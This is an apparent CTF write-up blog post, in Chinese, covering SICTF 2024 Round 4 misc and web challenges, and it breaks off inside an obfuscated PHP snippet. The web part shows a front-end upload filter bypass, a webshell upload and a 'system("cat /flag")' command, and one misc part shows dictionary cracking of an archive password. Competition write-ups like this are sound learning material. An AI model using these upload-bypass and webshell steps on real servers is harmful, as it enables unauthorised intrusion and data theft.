<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"xtyy0510.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="SICTF 2024 #Round 4 Misc(5&#x2F;5)签到!不必多言，直接关注公众号，发送SICTF Round4即可 派森按照谐音写出加密脚本，其实这里用语音识别应该也可以 12345678910111213from operator import xor#from 提克有第爱慕 import *answer&#x3D;[16, 29, 67, 84, 31, 75, 89, 48, 30,">
<meta property="og:type" content="article">
<meta property="og:title" content="SICTF 2024">
<meta property="og:url" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/index.html">
<meta property="og:site_name" content="xtyy&#39;s blog">
<meta property="og:description" content="SICTF 2024 #Round 4 Misc(5&#x2F;5)签到!不必多言，直接关注公众号，发送SICTF Round4即可 派森按照谐音写出加密脚本，其实这里用语音识别应该也可以 12345678910111213from operator import xor#from 提克有第爱慕 import *answer&#x3D;[16, 29, 67, 84, 31, 75, 89, 48, 30,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/1.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/2.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/3.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/4.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/5.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/6.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/7.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/8.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/9.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/10.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/11.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/12.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/13.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/14.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/15.jpg">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/16.png">
<meta property="og:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/17.jpg">
<meta property="article:published_time" content="2024-11-06T12:20:58.000Z">
<meta property="article:modified_time" content="2024-11-08T10:49:20.154Z">
<meta property="article:author" content="星潭月音">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="web">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/1.jpg">

<link rel="canonical" href="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SICTF 2024 | xtyy's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xtyy's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://xtyy0510.github.io/2024/11/06/SICTF-2024-round4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="星潭月音">
      <meta itemprop="description" content="CTF">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xtyy's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SICTF 2024
        </h1>

        <div class="post-meta">
		  <span class="post-time">
		  
		  
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-06 20:20:58" itemprop="dateCreated datePublished" datetime="2024-11-06T20:20:58+08:00">2024-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-08 18:49:20" itemprop="dateModified" datetime="2024-11-08T18:49:20+08:00">2024-11-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%AF%94%E8%B5%9Bwriteup/" itemprop="url" rel="index"><span itemprop="name">比赛writeup</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="SICTF-2024-Round-4"><a href="#SICTF-2024-Round-4" class="headerlink" title="SICTF 2024 #Round 4"></a><strong>SICTF 2024 #Round 4</strong></h1><p><img src="/2024/11/06/SICTF-2024-round4/1.jpg" alt="图片"></p>
<h2 id="Misc-5-5"><a href="#Misc-5-5" class="headerlink" title="Misc(5&#x2F;5)"></a><strong>Misc(5&#x2F;5)</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到!"></a><strong>签到!</strong></h3><p>不必多言，直接关注公众号，发送SICTF Round4即可</p>
<h3 id="派森"><a href="#派森" class="headerlink" title="派森"></a><strong>派森</strong></h3><p>按照谐音写出加密脚本，其实这里用语音识别应该也可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"><span class="comment">#from 提克有第爱慕 import *</span></span><br><span class="line">answer=[<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line">flag=<span class="comment">#&quot;SICTF&#123;&quot;+a+&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">ink = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>):</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i]),<span class="built_in">ord</span>(flag[i+<span class="number">2</span>])))</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i+<span class="number">1</span>]),<span class="built_in">ord</span>(flag[i+<span class="number">3</span>])))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">2</span>]))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">3</span>]))</span><br><span class="line"><span class="built_in">print</span>(ink)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>感觉第二个import没用到，不管他，直接逆向写出解密脚本，拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">ink = [<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ink), <span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i], ink[i+<span class="number">2</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i+<span class="number">1</span>], ink[i+<span class="number">3</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">2</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="模型的秘密"><a href="#模型的秘密" class="headerlink" title="模型的秘密"></a><strong>模型的秘密</strong></h3><p>拿到压缩包，给了大字典，直接字典爆破出密码</p>
<p>Advanced Archive Password Recovery 统计信息:</p>
<p>总计口令: 116</p>
<p>总计时间: 24ms </p>
<p>平均速度(口令&#x2F;秒): 4,833</p>
<p>这个文件的口令 : haldaemon</p>
<p>十六进制口令: 68 61 6c 64 61 65 6d 6f 6e </p>
<p>打开文件夹，是一个blender建模文件，修复文件头</p>
<p>如果不知道文件头是什么，而且网上也查不到的话，完全可以新建一个同类型文件查看</p>
<p><img src="/2024/11/06/SICTF-2024-round4/2.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/3.jpg" alt="img"></p>
<p>用blender4.2打开，得到flag</p>
<p>用其他版本的blender打开是正方体，在这里卡了半天</p>
<h3 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a><strong>Picture</strong></h3><p>打开文件夹，俩个图片和一个python脚本，应该是自定义加密</p>
<p>代码审计一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">flag = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width, height = flag.size</span><br><span class="line">image1 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">image2 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        r,g,b = flag.getpixel((i,j))</span><br><span class="line">        tr, tg, tb = randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>)</span><br><span class="line">        image1.putpixel((i,j),(tr,tg,tb))</span><br><span class="line">        image2.putpixel((i,j),(r-tr,g-tg,b-tb))</span><br><span class="line">image1.save(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">image2.save(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的异或加密脚本，直接逆向脚本，拿到flag.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">flag2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">width, height = flag1.size</span><br><span class="line">image = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag1.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        tr1,tg1,tb1 = flag1.getpixel((i,j))</span><br><span class="line">        tr2,tg2,tb2 = flag2.getpixel((i,j))</span><br><span class="line">        image.putpixel((i,j),(tr1+tr2,tg1+tg2,tb1+tb2))</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>空白图片，stegsolve查看</p>
<p>拿到 flag<img src="/2024/11/06/SICTF-2024-round4/4.jpg" alt="img"></p>
<h3 id="外星信号-Ultra"><a href="#外星信号-Ultra" class="headerlink" title="外星信号 Ultra"></a><strong>外星信号 Ultra</strong></h3><p>图片末尾提示：</p>
<p>翻译一下是用苹果设备查看图片显示不同，应该是iDot png隐写</p>
<p> Apple 的 PNG 解码器有一个私有的功能：通过 <a href="https://link.zhihu.com/?target=https://www.hackerfactor.com/blog/index.php?/archives/895-Connecting-the-iDOTs.html">iDOT </a>进行并行解码，而其存在一个 BUG 或者说设计不严谨的地方</p>
<p>这原本是 Apple 为了 PNG 解码速度而做的一个优化 。按照 <a href="https://link.zhihu.com/?target=https://www.w3.org/TR/PNG/%2311Chunks">PNG 规范</a> ，PNG 图片分为多个数据块，图片内容的像素流会使用 <code>zlib.deflate</code> 算法压缩后存储在 IDAT 块中。按照标准可以把所有数据存储在一个大的 IDAT 块中，也可以分割存储在多个 IDAT 块中，这原本是为了编码解码时可控内存占用量而设计的，而没有考虑到并行解码，也就是说在对每一个 IDAT 块解压前并不会知道到其中包含了多少像素 。</p>
<p>苹果为了让 PNG 格式的图片可以并行解码并且兼容原本的 PNG 标准，把图片内容分为「前半」与「后半」2 部分，并把像素流分为多个 IDAT 块，然后在 PNG 文件里添加了一个 iDOT 辅助块，其中记录了「前半」「后半」的分隔位置（「后半」数据相对 iDOT 块的偏移值）和解压后的像素高度，这样用 Apple 的 PNG 编码器编码的 PNG 图片用 Apple 自家的 PNG 解码器解码就可以分为 2 个并行的过程，以此充分利用多核性能，同时这样的 PNG 图片也能被普通解码器解码</p>
<p>原理就不过多分析了，可以参考这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/447989118">🦎 在不同设备上显示不一样内容的神奇 PNG 图片 - 知乎</a></p>
<p>直接用在线网站看到</p>
<p><a target="_blank" rel="noopener" href="https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681">https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681</a></p>
<p><img src="/2024/11/06/SICTF-2024-round4/5.jpg" alt="img"></p>
<p>这里是伪随机数，写出解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">496534891</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_as_bytes</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_data = f.read()</span><br><span class="line">        decrypted_data = <span class="built_in">bytes</span>((byte ^ random.randint(<span class="number">10</span>, <span class="number">20</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> file_data))</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_to_file</span>(<span class="params">bytes_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line">enc = decrypt_file_as_bytes(<span class="string">&quot;data&quot;</span>) </span><br><span class="line">write_bytes_to_file(enc, <span class="string">&quot;decrypted_deepsea.wav&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到deepsea.wav，用deepsound打开，获得一个sea.wav文件，SSTV扫描，拿到压缩包key</p>
<p><img src="/2024/11/06/SICTF-2024-round4/6.jpg" alt="img"></p>
<p>解压得到</p>
<p><img src="/2024/11/06/SICTF-2024-round4/7.jpg" alt="img"></p>
<p>文件名说是base2048，直接解密</p>
<p><img src="/2024/11/06/SICTF-2024-round4/8.jpg" alt="img"></p>
<p>拿到flag</p>
<h2 id="Web-3-4"><a href="#Web-3-4" class="headerlink" title="Web(3&#x2F;4)"></a><strong>Web(3&#x2F;4)</strong></h2><h3 id="Upl0ad"><a href="#Upl0ad" class="headerlink" title="Upl0ad"></a><strong>Upl0ad</strong></h3><p>右键查看源代码</p>
<p>看到一个js函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validateFileType</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[type=&quot;file&quot;]&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> allowedExtensions = <span class="regexp">/(\.jpg|\.jpeg|\.png|\.pdf)$/i</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">exec</span>(fileInput.<span class="property">value</span>)) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;只允许上传 JPG、PNG 或 PDF 文件。&#x27;</span>);</span><br><span class="line">            fileInput.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 清空选择</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>前端过滤，只允许上传jpg jpeg png pdf格式文件</p>
<p>简单的前端绕过，文件上传，直接传马bp改后缀：</p>
<p><img src="/2024/11/06/SICTF-2024-round4/9.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/10.jpg" alt="img"></p>
<p>上传成功，跳转到页面，直接命令执行即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/06/SICTF-2024-round4/11.jpg" alt="img"></p>
<h3 id="Sighin"><a href="#Sighin" class="headerlink" title="Sighin"></a><strong>Sighin</strong></h3><p>进入页面直接看源码</p>
<p><img src="/2024/11/06/SICTF-2024-round4/12.jpg" alt="img"></p>
<p>到robots.txt看一眼</p>
<p>要求访问&#x2F;wh3re_1s_thi5_fl4g.php</p>
<p><img src="/2024/11/06/SICTF-2024-round4/13.jpg" alt="img"></p>
<p>写出解密脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;wKq=1MDcLg6yYsrnRYivbO7JoWQ9rBhCZuo4DlZOS7_I5+t=UKzp0hdV1FNL2EFd/nxam3cTbPARsw+8Eky5XUpfH0MeTQ3JXtkGf9qj_4NmlHi/SeIVaCAgxGj26vW8PBzu&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$s</span>[<span class="number">72</span>] . <span class="variable">$s</span>[<span class="number">116</span>] . <span class="variable">$s</span>[<span class="number">76</span>] . <span class="variable">$s</span>[<span class="number">113</span>] . <span class="variable">$s</span>[<span class="number">124</span>] . <span class="variable">$s</span>[<span class="number">35</span>] . <span class="variable">$s</span>[<span class="number">104</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">91</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">24</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">113</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">123</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">60</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">108</span>] . <span class="variable">$s</span>[<span class="number">32</span>] . <span class="variable">$s</span>[<span class="number">107</span>] . <span class="variable">$s</span>[<span class="number">37</span>] . <span class="variable">$s</span>[<span class="number">131</span>] . <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">25</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">100</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">68</span>] . <span class="variable">$s</span>[<span class="number">57</span>] . <span class="variable">$s</span>[<span class="number">11</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">77</span>] . <span class="variable">$s</span>[<span class="number">3</span>] . <span class="variable">$s</span>[<span class="number">3</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">62</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span class="variable">$s</span>[<span class="number">74</span>] . 